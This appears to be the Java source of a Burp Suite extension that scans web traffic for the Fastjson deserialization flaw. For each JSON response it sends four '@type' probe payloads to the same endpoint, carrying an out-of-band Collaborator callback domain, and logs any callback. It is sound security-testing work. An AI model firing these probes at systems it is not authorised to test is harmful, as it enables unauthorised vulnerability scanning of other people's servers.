package burp;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, ITab, IHttpListener, IMessageEditorController{
    private PrintWriter stdout;
    private PrintWriter stderr;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private IBurpCollaboratorClientContext collaboratorContext;
    private List<IBurpCollaboratorInteraction> collaboratorInteractions;
    private ArrayList<String> payloads = new ArrayList<String>();
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks iBurpExtenderCallbacks) {
        stdout = new PrintWriter(iBurpExtenderCallbacks.getStdout(), true);
        stderr = new PrintWriter(iBurpExtenderCallbacks.getStderr(), true);
        callbacks = iBurpExtenderCallbacks;
        helpers = iBurpExtenderCallbacks.getHelpers();
        iBurpExtenderCallbacks.setExtensionName("burp_learn");
        iBurpExtenderCallbacks.registerHttpListener(this);
        collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        initPaylods();
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {
                // main split pane
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

                // table of log entries
                Table logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);

                // tabs with request/response viewers
                JTabbedPane tabs = new JTabbedPane();
                requestViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(BurpExtender.this, false);
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());
                splitPane.setRightComponent(tabs);

                // customize our UI components
                callbacks.customizeUiComponent(splitPane);
                callbacks.customizeUiComponent(logTable);
                callbacks.customizeUiComponent(scrollPane);
                callbacks.customizeUiComponent(tabs);

                // add the custom tab to Burp's UI
                callbacks.addSuiteTab(BurpExtender.this);

                // register ourselves as an HTTP listener
                callbacks.registerHttpListener(BurpExtender.this);
            }
        });
    }

    @Override
    public String getTabCaption()
    {
        return "Java_RCE_Checker";
    }

    @Override
    public Component getUiComponent()
    {
        return splitPane;
    }

    public void initPaylods(){
        /*fastjson漏洞1.2.41-1.2.67 dnslog 测试payload*/
        payloads.add("{\"x\":{\"@type\":\"java.net.URL\",\"val\":\"http://payload\"}}");
        payloads.add("{\"x\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"payload\"}}");
        payloads.add("{\"x\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"payload\"}}");
        payloads.add("{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"payload\"}}}");
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if ((toolFlag == IBurpExtenderCallbacks.TOOL_PROXY) || (toolFlag == IBurpExtenderCallbacks.TOOL_REPEATER)){
            if(!messageIsRequest){
                IResponseInfo analyzeResponse = helpers.analyzeResponse(messageInfo.getResponse());
                List<String> res_headers = analyzeResponse.getHeaders();
                String payload = collaboratorContext.generatePayload(true);
                IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);

                for(String header:res_headers){
                    if (header.startsWith("Content-Type:") && header.contains("application/json")){
                        List<String> req_headers = analyzeRequest.getHeaders();
                        req_headers.set(0,req_headers.get(0).replace("GET","POST")); //replace "get" to "post"
                        for (String pl : payloads) {
                            String body1 = pl.replace("payload",payload);
                            byte[] new_Request = helpers.buildHttpMessage(req_headers, body1.getBytes());
                            //如果修改了header或者数修改了body，不能通过updateParameter，使用这个方法。
                            callbacks.makeHttpRequest(messageInfo.getHttpService(), new_Request);
                        }
                        break;
                    }
                }

                collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(payload);
                if (collaboratorInteractions!=null && (!collaboratorInteractions.isEmpty())) {
                    synchronized (log){
                        int row = log.size();
                        log.add(new LogEntry(analyzeRequest.getUrl(),
                                callbacks.saveBuffersToTempFiles(messageInfo),
                                "Fastjson RCE",
                                true));
                        fireTableRowsInserted(row,row);
                    }
                }
            }
        }
    }

    @Override
    public int getRowCount()
    {
        return log.size();
    }

    @Override
    public int getColumnCount()
    {
        return 3;
    }

    @Override
    public String getColumnName(int columnIndex)
    {
        switch (columnIndex)
        {
            case 0:
                return "URL&PARM";
            case 1:
                return "Type";
            case 2:
                return "Exists";
            default:
                return "";
        }
    }

    @Override
    public Class<?> getColumnClass(int columnIndex)
    {
        return String.class;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex)
    {
        LogEntry logEntry = log.get(rowIndex);
        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.type;
            case 2:
                return logEntry.state;
            default:
                return "";
        }
    }

    @Override
    public byte[] getRequest()
    {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse()
    {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public IHttpService getHttpService()
    {
        return currentlyDisplayedItem.getHttpService();
    }

    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    private static class LogEntry
    {
        final URL url;
        final IHttpRequestResponsePersisted requestResponse;
        final String type;
        final boolean state;

        LogEntry(URL url, IHttpRequestResponsePersisted requestResponse, String type,boolean state)
        {
            this.url = url;
            this.requestResponse = requestResponse;
            this.type = type;
            this.state = state;
        }
    }
}
